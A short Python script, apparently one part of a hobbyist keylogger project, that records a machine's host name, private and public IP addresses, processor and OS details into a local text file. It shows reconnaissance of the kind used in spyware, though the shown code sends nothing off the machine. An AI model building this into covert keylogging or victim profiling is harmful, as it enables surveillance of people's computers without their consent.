#Libraries to gather system information on a computer
import socket
import platform
from requests import get

import os

computer_infomation = "computer_info.txt"

file_path = "C:\\Users\\bardh\\OneDrive\\Desktop\\keylogger\\KeyLogger Project"     # Change dest file path before test
extension = "\\"

# Function to collect the system information
def gather_information():
    with open(file_path + extension + computer_infomation, "a") as f:
        host = socket.gethostname()
        ip_address = socket.gethostbyname(host)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")

        except Exception:
            f.write("Failed to find a public IP address" + "\n")

        f.write("Host: " + host + "\n")
        f.write("Private IP Address: " + ip_address + "\n")

        f.write("Processor: " + (platform.processor()) + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")

# Deletes the content in the text file
if os.path.exists("computer_info.txt"):
    with open("computer_info.txt", "r") as f:
        f = open("computer_info.txt", "r+")
        f.seek(0)
        f.truncate()

gather_information()

